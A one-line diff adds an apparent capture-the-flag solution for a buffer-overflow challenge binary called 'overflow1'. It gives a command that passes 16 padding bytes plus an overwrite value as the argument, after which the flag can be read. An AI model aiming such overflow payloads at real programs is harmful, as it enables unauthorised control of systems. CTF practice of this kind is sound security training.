@@ -1,0 +1,1 @@
+Simple overflow, just run `./overflow1 $(printf "aaaaaaaaaaaaaaaa\xff\x7f\xec\x1c")`, and you can cat the flag!
